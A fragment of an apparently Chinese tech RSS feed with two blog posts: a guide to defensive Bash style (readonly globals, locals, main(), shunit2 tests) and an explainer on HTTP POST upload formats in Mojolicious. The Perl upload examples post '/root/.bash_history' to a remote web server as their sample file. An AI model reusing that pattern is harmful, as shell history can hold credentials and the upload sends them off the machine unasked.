        <guid isPermaLink="true">http://iftti.com/posts/2014/2014-07-17-73701-418acf0a6.html</guid>
        
        
      </item>
    
      <item>
        <title>BASH的保护性编程技巧</title>
        <description>

					
		
&lt;!-- div id=&quot;ad1&quot;&gt;
&lt;script type=&quot;text/javascript&quot;&gt;
google_ad_client = &quot;ca-pub-7056282119617872&quot;;
google_ad_slot = &quot;6645040531&quot;;
google_ad_width = 300;
google_ad_height = 250;
&lt;/script&gt;
&lt;script type=&quot;text/javascript&quot;
src=&quot;http://pagead2.googlesyndication.com/pagead/show_ads.js&quot;&gt;
&lt;/script&gt;
&lt;/div&gt;
&lt;br/ --&gt;

&lt;div&gt;
&lt;p&gt;这是我写BASH程序的招式。这里本没有什么新的内容，但是从我的经验来看，人们爱滥用BASH。他们忽略了计算机科学，而从他们的程序中创造的是“&lt;a href=&quot;http://en.wikipedia.org/wiki/Big_ball_of_mud&quot;&gt;大泥球&lt;/a&gt;”（译注：指架构不清晰的软件系统）。&lt;/p&gt;
&lt;div&gt;在此我告诉你方法，以保护你的程序免于障碍，并保持代码的整洁。&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt; &lt;/p&gt;
&lt;h2&gt;不可改变的全局变量&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;尽量少用全局变量&lt;/li&gt;
&lt;li&gt;以大写命名&lt;/li&gt;
&lt;li&gt;只读声明&lt;/li&gt;
&lt;li&gt;用全局变量来代替隐晦的$0，$1等&lt;/li&gt;
&lt;li&gt;
&lt;div&gt;在我的程序中常使用的全局变量：&lt;/div&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;pre class=&quot;brush: bash; gutter: true&quot;&gt;readonly PROGNAME=$(basename $0)
readonly PROGDIR=$(readlink -m $(dirname $0))
readonly ARGS=&quot;$@&quot;&lt;/pre&gt;
&lt;p&gt; &lt;/p&gt;
&lt;h2&gt;一切皆是局部的&lt;/h2&gt;
&lt;p&gt;所有变量都应为局部的。&lt;/p&gt;
&lt;pre class=&quot;brush: bash; gutter: true&quot;&gt;change_owner_of_file() {
    local filename=$1
    local user=$2
    local group=$3

    chown $user:$group $filename
}&lt;/pre&gt;
&lt;pre class=&quot;brush: bash; gutter: true&quot;&gt;change_owner_of_files() {
    local user=$1; shift
    local group=$1; shift
    local files=$@
    local i

    for i in $files
    do
        chown $user:$group $i
    done
}&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;自注释（self documenting）的参数&lt;/li&gt;
&lt;li&gt;通常作为循环用的变量i，把它声明为局部变量是很重要的。&lt;/li&gt;
&lt;li&gt;局部变量不作用于全局域。&lt;/li&gt;
&lt;/ul&gt;
&lt;pre class=&quot;brush: bash; gutter: true&quot;&gt;kfir@goofy ~ $ local a
bash: local: can only be used in a function&lt;/pre&gt;
&lt;figure&gt;
&lt;h2&gt;&lt;/h2&gt;
&lt;/figure&gt;
&lt;div&gt;
&lt;h2&gt;main()&lt;/h2&gt;
&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;有助于保持所有变量的局部性&lt;/li&gt;
&lt;li&gt;直观的函数式编程&lt;/li&gt;
&lt;li&gt;
&lt;div&gt;代码中唯一的全局命令是：main&lt;/div&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;pre class=&quot;brush: bash; gutter: true&quot;&gt;main() {
    local files=&quot;/tmp/a /tmp/b&quot;
    local i

    for i in $files
    do
        change_owner_of_file kfir users $i
    done
}
main&lt;/pre&gt;
&lt;figure&gt;&lt;/figure&gt;
&lt;h2&gt;&lt;/h2&gt;
&lt;h2&gt;&lt;span style=&quot;font-family: &#39;Helvetica Neue&#39;, Helvetica, Arial, sans-serif; font-size: 24px; font-style: normal; font-weight: bold; line-height: 36px;&quot;&gt;一切皆是函数&lt;/span&gt;&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;唯一全局性运行的代码是：&lt;/li&gt;
&lt;/ul&gt;
&lt;p style=&quot;padding-left: 30px;&quot;&gt;- 不可变的全局变量声明&lt;/p&gt;
&lt;p style=&quot;padding-left: 30px;&quot;&gt;- main()函数&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;保持代码整洁&lt;/li&gt;
&lt;li&gt;过程变得清晰&lt;/li&gt;
&lt;/ul&gt;
&lt;pre class=&quot;brush: bash; gutter: true&quot;&gt;main() {
    local files=$(ls /tmp | grep pid | grep -v daemon)
}&lt;/pre&gt;
&lt;pre class=&quot;brush: bash; gutter: true&quot;&gt;temporary_files() {
    local dir=$1

    ls $dir \
        | grep pid \
        | grep -v daemon
}

main() {
    local files=$(temporary_files /tmp)
}&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;第二个例子好得多。查找文件是temporary_files()的问题而非main()的。这段代码用temporary_files()的单元测试也是可测试的。&lt;/div&gt;
&lt;/li&gt;
&lt;li&gt;如果你一定要尝试第一个例子，你会得到查找临时文件以和main算法的大杂烩。&lt;/li&gt;
&lt;/ul&gt;
&lt;pre class=&quot;brush: bash; gutter: true&quot;&gt;test_temporary_files() {
    local dir=/tmp

    touch $dir/a-pid1232.tmp
    touch $dir/a-pid1232-daemon.tmp

    returns &quot;$dir/a-pid1232.tmp&quot; temporary_files $dir

    touch $dir/b-pid1534.tmp

    returns &quot;$dir/a-pid1232.tmp $dir/b-pid1534.tmp&quot; temporary_files $dir
}&lt;/pre&gt;
&lt;div&gt;如你所见，这个测试不关心main()。&lt;/div&gt;
&lt;h2&gt;&lt;/h2&gt;
&lt;h2&gt;&lt;span style=&quot;font-family: &#39;Helvetica Neue&#39;, Helvetica, Arial, sans-serif; font-size: 24px; font-style: normal; font-weight: bold; line-height: 36px;&quot;&gt;调试函数&lt;/span&gt;&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;带-x标志运行程序：&lt;/li&gt;
&lt;/ul&gt;
&lt;pre class=&quot;brush: bash; gutter: true&quot;&gt;bash -x my_prog.sh&lt;/pre&gt;
&lt;div&gt;只调试一小段代码，使用set-x和set+x，会只对被set -x和set +x包含的当前代码打印调试信息。&lt;/div&gt;
&lt;div&gt;
&lt;pre class=&quot;brush: bash; gutter: true&quot;&gt;temporary_files() {
    local dir=$1

    set -x
    ls $dir \
        | grep pid \
        | grep -v daemon
    set +x
}&lt;/pre&gt;
&lt;/div&gt;
&lt;div&gt;
&lt;div&gt;打印函数名和它的参数：&lt;/div&gt;
&lt;div&gt;
&lt;pre class=&quot;brush: bash; gutter: true&quot;&gt;temporary_files() {
    echo $FUNCNAME $@
    local dir=$1

    ls $dir \
        | grep pid \
        | grep -v daemon
}&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;调用函数：&lt;/p&gt;
&lt;pre class=&quot;brush: bash; gutter: true&quot;&gt;temporary_files /tmp&lt;/pre&gt;
&lt;p&gt;会打印到标准输出：&lt;/p&gt;
&lt;pre class=&quot;brush: bash; gutter: true&quot;&gt;temporary_files /tmp&lt;/pre&gt;
&lt;figure&gt;&lt;/figure&gt;
&lt;div&gt;
&lt;h2&gt;&lt;/h2&gt;
&lt;h2&gt;代码的清晰度&lt;/h2&gt;
&lt;/div&gt;
&lt;p&gt;这段代码做了什么？&lt;/p&gt;
&lt;pre class=&quot;brush: bash; gutter: true&quot;&gt;main() {
    local dir=/tmp

    [[ -z $dir ]] \
        &amp;amp;&amp;amp; do_something...

    [[ -n $dir ]] \
        &amp;amp;&amp;amp; do_something...

    [[ -f $dir ]] \
        &amp;amp;&amp;amp; do_something...

    [[ -d $dir ]] \
        &amp;amp;&amp;amp; do_something...
}
main&lt;/pre&gt;
&lt;figure&gt;&lt;/figure&gt;
&lt;p&gt;让你的代码说话：&lt;/p&gt;
&lt;pre class=&quot;brush: bash; gutter: true&quot;&gt;is_empty() {
    local var=$1

    [[ -z $var ]]
}

is_not_empty() {
    local var=$1

    [[ -n $var ]]
}

is_file() {
    local file=$1

    [[ -f $file ]]
}

is_dir() {
    local dir=$1

    [[ -d $dir ]]
}

main() {
    local dir=/tmp

    is_empty $dir \
        &amp;amp;&amp;amp; do_something...

    is_not_empty $dir \
        &amp;amp;&amp;amp; do_something...

    is_file $dir \
        &amp;amp;&amp;amp; do_something...

    is_dir $dir \
        &amp;amp;&amp;amp; do_something...
}
main&lt;/pre&gt;
&lt;figure&gt;&lt;/figure&gt;
&lt;h2&gt;&lt;/h2&gt;
&lt;h2&gt;&lt;span style=&quot;font-family: &#39;Helvetica Neue&#39;, Helvetica, Arial, sans-serif; font-size: 24px; font-style: normal; font-weight: bold; line-height: 36px;&quot;&gt;每一行只做一件事&lt;/span&gt;&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;用反斜杠\来作分隔符。例如：&lt;/div&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;pre class=&quot;brush: bash; gutter: true&quot;&gt;temporary_files() {
    local dir=$1

    ls $dir | grep pid | grep -v daemon
}&lt;/pre&gt;
&lt;figure&gt;&lt;/figure&gt;
&lt;p&gt;可以写得简洁得多：&lt;/p&gt;
&lt;pre class=&quot;brush: bash; gutter: true&quot;&gt;temporary_files() {
    local dir=$1

    ls $dir \
        | grep pid \
        | grep -v daemon
}&lt;/pre&gt;
&lt;div&gt;
&lt;ul&gt;
&lt;li&gt;符号在缩进行的开始&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;符号在行末的坏例子：（译注：原文在此例中用了temporary_files()代码段，疑似是贴错了。结合上下文，应为print_dir_if_not_empty()）&lt;/p&gt;
&lt;/div&gt;
&lt;figure&gt;&lt;/figure&gt;
&lt;pre class=&quot;brush: bash; gutter: true&quot;&gt;print_dir_if_not_empty() {
    local dir=$1

    is_empty $dir &amp;amp;&amp;amp; \
        echo &quot;dir is empty&quot; || \
        echo &quot;dir=$dir&quot;
}&lt;/pre&gt;
&lt;p&gt;好的例子：我们可以清晰看到行和连接符号之间的联系。&lt;/p&gt;
&lt;pre class=&quot;brush: bash; gutter: true&quot;&gt;print_dir_if_not_empty() {
    local dir=$1

    is_empty $dir \
        &amp;amp;&amp;amp; echo &quot;dir is empty&quot; \
        || echo &quot;dir=$dir&quot;
}&lt;/pre&gt;
&lt;figure&gt;&lt;/figure&gt;
&lt;h2&gt;&lt;/h2&gt;
&lt;h2&gt;打印用法&lt;/h2&gt;
&lt;p&gt;不要这样做：&lt;/p&gt;
&lt;pre class=&quot;brush: bash; gutter: true&quot;&gt;echo &quot;this prog does:...&quot;
echo &quot;flags:&quot;
echo &quot;-h print help&quot;&lt;/pre&gt;
&lt;figure&gt;&lt;/figure&gt;
&lt;p&gt;它应该是个函数：&lt;/p&gt;
&lt;pre class=&quot;brush: bash; gutter: true&quot;&gt;usage() {
    echo &quot;this prog does:...&quot;
    echo &quot;flags:&quot;
    echo &quot;-h print help&quot;
}&lt;/pre&gt;
&lt;figure&gt;&lt;/figure&gt;
&lt;p&gt;echo在每一行重复。因此我们得到了这个文档：&lt;/p&gt;
&lt;pre class=&quot;brush: bash; gutter: true&quot;&gt;usage() {
    cat &amp;lt;&amp;lt;- EOF
    usage: $PROGNAME options

    Program deletes files from filesystems to release space. 
    It gets config file that define fileystem paths to work on, and whitelist rules to 
    keep certain files.

    OPTIONS:
       -c --config              configuration file containing the rules. use --help-config to see the syntax.
       -n --pretend             do not really delete, just how what you are going to do.
       -t --test                run unit test to check the program
       -v --verbose             Verbose. You can specify more then one -v to have more verbose
       -x --debug               debug
       -h --help                show this help
          --help-config         configuration help

    Examples:
       Run all tests:
       $PROGNAME --test all

       Run specific test:
       $PROGNAME --test test_string.sh

       Run:
       $PROGNAME --config /path/to/config/$PROGNAME.conf

       Just show what you are going to do:
       $PROGNAME -vn -c /path/to/config/$PROGNAME.conf
    EOF
}&lt;/pre&gt;
&lt;figure&gt;&lt;/figure&gt;
&lt;p&gt;注意在每一行的行首应该有一个真正的制表符‘\t’。&lt;/p&gt;
&lt;p&gt;在vim里，如果你的tab是4个空格，你可以用这个替换命令：&lt;/p&gt;
&lt;pre class=&quot;brush: bash; gutter: true&quot;&gt;:s/^    /\t/&lt;/pre&gt;
&lt;figure&gt;&lt;/figure&gt;
&lt;h2&gt;&lt;/h2&gt;
&lt;h2&gt;&lt;span style=&quot;font-family: &#39;Helvetica Neue&#39;, Helvetica, Arial, sans-serif; font-size: 24px; font-style: normal; font-weight: bold; line-height: 36px;&quot;&gt;命令行参数&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;这里是一个例子，完成了上面usage函数的用法。我从&lt;a title=&quot;bash shell script to use getopts with gnu style long positional parameters&quot; href=&quot;http://kirk.webfinish.com/2009/10/bash-shell-script-to-use-getopts-with-gnu-style-long-positional-parameters/&quot;&gt;Kirk’s blog post – bash shell script to use getopts with gnu style long positional parameters&lt;/a&gt;得到这段代码&lt;/p&gt;
&lt;pre class=&quot;brush: bash; gutter: true&quot;&gt;cmdline() {
    # got this idea from here:
    # http://kirk.webfinish.com/2009/10/bash-shell-script-to-use-getopts-with-gnu-style-long-positional-parameters/
    local arg=
    for arg
    do
        local delim=&quot;&quot;
        case &quot;$arg&quot; in
            #translate --gnu-long-options to -g (short options)
            --config)         args=&quot;${args}-c &quot;;;
            --pretend)        args=&quot;${args}-n &quot;;;
            --test)           args=&quot;${args}-t &quot;;;
            --help-config)    usage_config &amp;amp;amp;&amp;amp;amp; exit 0;;
            --help)           args=&quot;${args}-h &quot;;;
            --verbose)        args=&quot;${args}-v &quot;;;
            --debug)          args=&quot;${args}-x &quot;;;
            #pass through anything else
            *) [[ &quot;${arg:0:1}&quot; == &quot;-&quot; ]] || delim=&quot;\&quot;&quot;
                args=&quot;${args}${delim}${arg}${delim} &quot;;;
        esac
    done

    #Reset the positional parameters to the short options
    eval set -- $args

    while getopts &quot;nvhxt:c:&quot; OPTION
    do
         case $OPTION in
         v)
             readonly VERBOSE=1
             ;;
         h)
             usage
             exit 0
             ;;
         x)
             readonly DEBUG=&#39;-x&#39;
             set -x
             ;;
         t)
             RUN_TESTS=$OPTARG
             verbose VINFO &quot;Running tests&quot;
             ;;
         c)
             readonly CONFIG_FILE=$OPTARG
             ;;
         n)
             readonly PRETEND=1
             ;;
        esac
    done

    if [[ $recursive_testing || -z $RUN_TESTS ]]; then
        [[ ! -f $CONFIG_FILE ]] \
            &amp;amp;amp;&amp;amp;amp; eexit &quot;You must provide --config file&quot;
    fi
    return 0
}&lt;/pre&gt;
&lt;figure&gt;&lt;/figure&gt;
&lt;p&gt;你像这样，使用我们在头上定义的不可变的ARGS变量：&lt;/p&gt;
&lt;pre class=&quot;brush: bash; gutter: true&quot;&gt;main() {
    cmdline $ARGS
}
main&lt;/pre&gt;
&lt;figure&gt;&lt;/figure&gt;
&lt;h2&gt;&lt;/h2&gt;
&lt;h2&gt;&lt;span style=&quot;font-family: &#39;Helvetica Neue&#39;, Helvetica, Arial, sans-serif; font-size: 24px; font-style: normal; font-weight: bold; line-height: 36px;&quot;&gt;单元测试&lt;/span&gt;&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;在更高级的语言中很重要。&lt;/li&gt;
&lt;li&gt;
&lt;div&gt;使用shunit2做单元测试&lt;/div&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;pre class=&quot;brush: bash; gutter: true&quot;&gt;test_config_line_paths() {
    local s=&#39;partition cpm-all, 80-90,&#39;

    returns &quot;/a&quot; &quot;config_line_paths &#39;$s /a, &#39;&quot;
    returns &quot;/a /b/c&quot; &quot;config_line_paths &#39;$s /a:/b/c, &#39;&quot;
    returns &quot;/a /b /c&quot; &quot;config_line_paths &#39;$s   /a  :    /b : /c, &#39;&quot;
}

config_line_paths() {
    local partition_line=&quot;$@&quot;

    echo $partition_line \
        | csv_column 3 \
        | delete_spaces \
        | column 1 \
        | colons_to_spaces
}

source /usr/bin/shunit2&lt;/pre&gt;
&lt;p&gt;这里是另一个使用df命令的例子：&lt;/p&gt;
&lt;pre class=&quot;brush: bash; gutter: true&quot;&gt;DF=df

mock_df_with_eols() {
    cat &amp;amp;lt;&amp;amp;lt;- EOF
    Filesystem           1K-blocks      Used Available Use% Mounted on
    /very/long/device/path
                         124628916  23063572 100299192  19% /
    EOF
}

test_disk_size() {
    returns 1000 &quot;disk_size /dev/sda1&quot;

    DF=mock_df_with_eols
    returns 124628916 &quot;disk_size /very/long/device/path&quot;
}

df_column() {
    local disk_device=$1
    local column=$2

    $DF $disk_device \
        | grep -v &#39;Use%&#39; \
        | tr &#39;\n&#39; &#39; &#39; \
        | awk &quot;{print \$$column}&quot;
}

disk_size() {
    local disk_device=$1

    df_column $disk_device 2
}&lt;/pre&gt;
&lt;p&gt;这里我有个例外，为了测试，我在全局域中声明了DF为非只读。这是因为shunit2不允许改变全局域函数。&lt;/p&gt;


&lt;!-- div id=&quot;ad1&quot;&gt;
&lt;/div --&gt;

&lt;p&gt;&lt;a target=&quot;_blank&quot; rel=&quot;nofollow&quot; href=&quot;http://www.jobdeer.com/?fr=jobbole&quot;&gt;&lt;/a&gt;&lt;/p&gt;
	


	

</description>
        <pubDate>Thu, 17 Jul 2014 00:00:00 +0800</pubDate>
        <link>http://iftti.com/posts/2014/2014-07-17-73257-503521781.html</link>
        <guid isPermaLink="true">http://iftti.com/posts/2014/2014-07-17-73257-503521781.html</guid>
        
        
      </item>
    
      <item>
        <title>HTTP 的 POST 参数提交和上传的不同与 Mojolicious 的实现.</title>
        <description>

							&lt;p&gt;对于 HTTP 协议, 我们在使用 POST 上传的时候, 其实是有好几种不同的处理方式的, 所以对于客户端和服务器端, 也分别都有不同的处理. 正常普通的网页在提交参数上传到服务器的时候, 主要会根据内容的不同来使用不同的处理. 所体现在不同的地方在 Content-Type 的类型.&lt;br&gt;
比如我们常常用 Mojolicious 处理这类接收到的参数和内容的时候, 会让很多人晕掉, 所以我在这, 基于协议的头, 来给大家介绍一下在参数和上传的时候有什么不同.&lt;br&gt;
客户端, 比如浏览器网页中的 form 的表格的参数的不同, 客户端比如 Linux 命令行的 curl 的参数的不同和程序接口提交参数的不同, HTTP 协议在上传的时候, 大约会有三种不同, 这些体现在 Content-Type 的三种类型:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
		application/x-www-form-urlencoded&lt;/li&gt;
&lt;li&gt;
		multipart/form-data&lt;/li&gt;
&lt;li&gt;
		post 的 body 的内容&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;下面我们来详细介绍&lt;/p&gt;
&lt;h3&gt;
	1. application/x-www-form-urlencoded 默认&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;浏览器:&lt;/strong&gt;  在 HTML 中 form 有个参数是 enctype 属性用于指定编码方式, 常用有前面讲的两种: application/x-www-form-urlencoded 和 multipart/form-data. 但默认的时候, 我们并不指定. 不指定的时候, 默认是 &quot;application/x-www-form-urlencoded&quot; , 所以其实, 我们平时都是使用的这种格式来提交数据. 因为是默认就不写出来了. 注意, 这个会对空格和特别的符号进行 url 的 encode.&lt;br&gt;
 &lt;br&gt;
&lt;strong&gt;程序:&lt;/strong&gt; 我们现在以 Mojo::UserAgent 这个模块为例子, 我们提交一个参数 args 值为 test.&lt;/p&gt;
&lt;pre class=&quot;brush:perl;first-line:1;pad-line-numbers:true;highlight:null;collapse:false;&quot;&gt;
$ua-&amp;gt;post(&#39;http://www.php-oa.com/a/b&#39; =&amp;gt; form =&amp;gt; { args =&amp;gt; &#39;test&#39;});

&lt;/pre&gt;
&lt;p&gt;命令:&lt;/p&gt;
&lt;pre class=&quot;brush:perl;first-line:1;pad-line-numbers:true;highlight:null;collapse:false;&quot;&gt;
$curl -svo /dev/null -d &quot;args=test&quot; http://www.php-oa.com/a/b
&lt;/pre&gt;
&lt;p&gt;
&lt;strong&gt;HTTP 协议状态&lt;/strong&gt;&lt;br&gt;
这个时候所发送的 HTTP 的头和内容分别如下. body 中会存着参数, 会有一个特别的 Header.&lt;/p&gt;
&lt;pre class=&quot;brush:perl;first-line:1;pad-line-numbers:true;highlight:null;collapse:false;&quot;&gt;
-- Blocking request (http://www.php-oa.com/a/b)
-- Connect (http:www.php-oa.com:80)
-- Client &amp;gt;&amp;gt;&amp;gt; Server (http://www.php-oa.com/a/b)
POST /a/b HTTP/1.1
User-Agent: Mojolicious (Perl)
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
Content-Length: 9
Host: www.php-oa.com

args=test
&lt;/pre&gt;
&lt;p&gt;
&lt;strong&gt;服务端接收方式&lt;/strong&gt;&lt;br&gt;
这个时候, 服务器会根据因为是 POST 的方法, 并且头部的 Content-Type: application/x-www-form-urlencoded 会去解析 body 的参数. 这样在 Mojolicious 服务器&lt;/p&gt;
&lt;pre class=&quot;brush:perl;first-line:1;pad-line-numbers:true;highlight:null;collapse:false;&quot;&gt;
post &#39;/a/b&#39; =&amp;gt; sub {
  my $self = shift;
  my $foo  = $self-&amp;gt;param(&#39;args&#39;);
  $self-&amp;gt;render(text =&amp;gt; &quot;Hello from $foo.&quot;);
}

&lt;/pre&gt;
&lt;h3 style=&quot;padding:0px; margin:0px; font-family:微软雅黑,Verdana,sans-serif,宋体; line-height:24px; text-align:left&quot;&gt;
	 &lt;/h3&gt;
&lt;h3&gt;
	2. multipart/form-data 大文件, 媒体文件&lt;/h3&gt;
&lt;p&gt;对于比较大的, 有一些二进制数据和象视频文件之类大文件, 建议使用这种方式上传.&lt;br&gt;
&lt;strong&gt;浏览器:&lt;/strong&gt;&lt;br&gt;
普通的 HTTP 的写法如果要使用 enctype 的话, 只要象下面一样就行.&lt;/p&gt;
&lt;pre class=&quot;brush:perl;first-line:1;pad-line-numbers:true;highlight:null;collapse:false;&quot;&gt;
&amp;lt;form action=&quot;/path/to/login&quot; enctype=&quot;multipart/form-data&quot;&amp;gt;
  &amp;lt;input disabled=&quot;disabled&quot; name=&quot;first_name&quot; type=&quot;text&quot; /&amp;gt;
  &amp;lt;input value=&quot;Ok&quot; type=&quot;submit&quot; /&amp;gt;
&amp;lt;/form&amp;gt;

&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;客户端:&lt;/strong&gt;&lt;br&gt;
在 Mojo::UserAgent 考虑得非常周全, 当你提交的内容中包含二进制文件之类时, 就会自动帮你转换成 &quot;multipart/form-data&quot; 格式提交. 这个格式会生成一个随机字符来分割不同参数. 区分是否使用这种格式主要是, 当你提交的参数中, 又是一个引用, 并且引中可以使用 content 来指定内容或者 file 来指定路径.&lt;/p&gt;
&lt;pre class=&quot;brush:perl;first-line:1;pad-line-numbers:true;highlight:null;collapse:false;&quot;&gt;
$ua-&amp;gt;post(&#39;http://www.php-oa.com/a/b&#39; =&amp;gt; form =&amp;gt; { args =&amp;gt; &#39;test&#39;, args_file =&amp;gt; { file =&amp;gt; &#39;/root/.bash_history&#39; } });

# or
$ua-&amp;gt;post(&#39;http://www.php-oa.com/a/b&#39; =&amp;gt; form =&amp;gt; { args =&amp;gt; &#39;test&#39;, args_file =&amp;gt; { content =&amp;gt; &#39;test&#39; } });


&lt;/pre&gt;
&lt;p&gt;
&lt;strong&gt;HTTP 协议状态&lt;/strong&gt;&lt;br&gt;
这个地方我们可以见到 Content-Type: multipart/form-data 的请求头, 告诉文件和参数是这种格式上传过来的.并且 boundary 用于指定一个参数之间的分割符.&lt;/p&gt;
&lt;pre class=&quot;brush:perl;first-line:1;pad-line-numbers:true;highlight:null;collapse:false;&quot;&gt;
-- Blocking request (http://www.php-oa.com/a/b)
-- Connect (http:www.php-oa.com:80)
-- Client &amp;gt;&amp;gt;&amp;gt; Server (http://www.php-oa.com/a/b)
POST /a/b HTTP/1.1
User-Agent: Mojolicious (Perl)
Content-Type: multipart/form-data; boundary=WRoHX
Connection: keep-alive
Accept-Encoding: gzip
Content-Length: 14428
Host: www.php-oa.com

--WRoHX
Content-Disposition: form-data; name=&quot;args&quot;
test
--WRoHX
Content-Disposition: form-data; name=&quot;args_file&quot;; filename=&quot;.bash_history&quot;
........文件本身




&lt;/pre&gt;
&lt;p&gt;
&lt;strong&gt;服务器接收方式&lt;/strong&gt;&lt;br&gt;
在后端的服务器接收的时候 Mojolicious 想得非常周到. 对于这种格式能自动解析, 并且全程异步.不会多占内存. 这个会自动给大的文件使用一个叫 Mojo::Upload 的对象来处理, 我们可以通过 $self-&amp;gt;req-&amp;gt;upload(&#39;args_file&#39;); 这个方法取得这个内容的对象, 这个内容的对象是Mojo::Asset::File 这个对象, 存文件和取大文件之类可以直接调用.&lt;/p&gt;
&lt;pre class=&quot;brush:perl;first-line:1;pad-line-numbers:true;highlight:null;collapse:false;&quot;&gt;
post &#39;/a/b&#39; =&amp;gt; sub {
  my $self = shift;
  my $upload = $self-&amp;gt;req-&amp;gt;upload(&#39;args_file&#39;);
  my $foo  = $self-&amp;gt;param(&#39;args&#39;);
  $self-&amp;gt;render(text =&amp;gt; &quot;Hello from $foo.&quot;);
}


&lt;/pre&gt;
&lt;h3&gt;
	&lt;br&gt;
	3. POST 的 body 的内容&lt;/h3&gt;
&lt;p&gt;最后一种, 是有时我们做大文件上传, 和提交内容之类.这个时候, 整个 body 都是文件本体. 参数象 get 一样通过 url 传过去.&lt;br&gt;
这个就不用抓头了, 没任何转换, 直接整个 body 是个大文件.&lt;br&gt;
&lt;strong&gt;客户端提交:&lt;/strong&gt;&lt;br&gt;
我们来看看客户端在这个时候怎么上传送. 同样,  我们使用 Mojo::UserAgent 为例子.&lt;/p&gt;
&lt;pre class=&quot;brush:perl;first-line:1;pad-line-numbers:true;highlight:null;collapse:false;&quot;&gt;
my $ua = Mojo::UserAgent-&amp;gt;new;
$ua-&amp;gt;transactor-&amp;gt;add_generator(stream =&amp;gt; sub {
    my ($transactor, $tx, $path) = @_; 
    $tx-&amp;gt;req-&amp;gt;content-&amp;gt;asset(Mojo::Asset::File-&amp;gt;new(path =&amp;gt; $path));
});
$ua-&amp;gt;post(&#39;http://www.php-oa.com/a/b&#39; =&amp;gt; stream =&amp;gt; &#39;/root/.bash_history&#39; );

&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;服务器接收&lt;/strong&gt;&lt;br&gt;
这个时候, 在服务器端怎么接收啦?&lt;/p&gt;
&lt;pre class=&quot;brush:perl;first-line:1;pad-line-numbers:true;highlight:null;collapse:false;&quot;&gt;
post &#39;/a/b&#39; =&amp;gt; sub {
  my $self = shift;
  my $body = $self-&amp;gt;req-&amp;gt;body;
  my $foo  = $self-&amp;gt;param(&#39;args&#39;);
  $self-&amp;gt;render(text =&amp;gt; &quot;Hello from $foo.&quot;);
}

&lt;/pre&gt;
&lt;p&gt;这个, 我们直接取请求的 body 就可以了, 但这有个小问题, 这是这个文件上传完, 这个 body 会存着所有的文件, 比如这个上传的文件有 1G , 这个 1G 就都会占着内存. 这个情况, Mojolicious 并没有实现事件来根据块取文件. 晚点, 我有个有于大文件上传的文章, 会分享我在 Mojolicious 中实现异步以块方式存储文件. 这样用户上传多少, 我存多少, 并不会占用更多的内存.&lt;/p&gt;
&lt;p&gt;好了整个三种方式都介绍完了, 大家一定注意区分哦 .&lt;/p&gt;

			&lt;!--[syntaxhighlighter]--&gt;
			&lt;!--代码高亮，请勿编辑--&gt;
			&lt;script type=&quot;text/javascript&quot; src=&quot;http://www.php-oa.com/wp-content/plugins/ck-and-syntaxhighlighter/syntaxhighlighter/scripts/shCore.js&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;http://www.php-oa.com/wp-content/plugins/ck-and-syntaxhighlighter/syntaxhighlighter/scripts/shBrushPerl.js&quot;&gt;&lt;/script&gt;

			&lt;link type=&quot;text/css&quot; rel=&quot;stylesheet&quot; href=&quot;http://www.php-oa.com/wp-content/plugins/ck-and-syntaxhighlighter/syntaxhighlighter/styles/shCoreDefault.css&quot;&gt;
			&lt;link type=&quot;text/css&quot; rel=&quot;stylesheet&quot; href=&quot;http://www.php-oa.com/wp-content/plugins/ck-and-syntaxhighlighter/syntaxhighlighter/styles/shThemeDefault.css&quot;&gt;
			&lt;script type=&quot;text/javascript&quot;&gt;
			SyntaxHighlighter.defaults[&#39;class-name&#39;]	= &#39;.syntaxhighlighter {     background-color: 999999 }&#39;;
			SyntaxHighlighter.defaults[&#39;smart-tabs&#39;]	= true;
			SyntaxHighlighter.defaults[&#39;tab-size&#39;]		= 4;
			SyntaxHighlighter.defaults[&#39;gutter&#39;]		= true;
			SyntaxHighlighter.defaults[&#39;quick-code&#39;]	= true;
			SyntaxHighlighter.defaults[&#39;collapse&#39;] 		= false;
			SyntaxHighlighter.defaults[&#39;auto-links&#39;]	= true;
			SyntaxHighlighter.defaults[&#39;toolbar&#39;]		= true;
			SyntaxHighlighter.all();
			&lt;/script&gt;
			&lt;!--[/syntaxhighlighter]--&gt;						

</description>
        <pubDate>Tue, 15 Jul 2014 00:00:00 +0800</pubDate>
        <link>http://iftti.com/posts/2014/2014-07-15-http-post-mojolicious.html-e69430dd0.html</link>
        <guid isPermaLink="true">http://iftti.com/posts/2014/2014-07-15-http-post-mojolicious.html-e69430dd0.html</guid>
        
        
      </item>
    
      <item>
        <title>自动补完不算什么，一键直达目录才是终极神器！</title>
        <description>

					
		
&lt;!-- div id=&quot;ad1&quot;&gt;
&lt;script type=&quot;text/javascript&quot;&gt;
google_ad_client = &quot;ca-pub-7056282119617872&quot;;
google_ad_slot = &quot;6645040531&quot;;
google_ad_width = 300;
google_ad_height = 250;
&lt;/script&gt;
&lt;script type=&quot;text/javascript&quot;
src=&quot;http://pagead2.googlesyndication.com/pagead/show_ads.js&quot;&gt;
&lt;/script&gt;
&lt;/div&gt;
&lt;br/ --&gt;

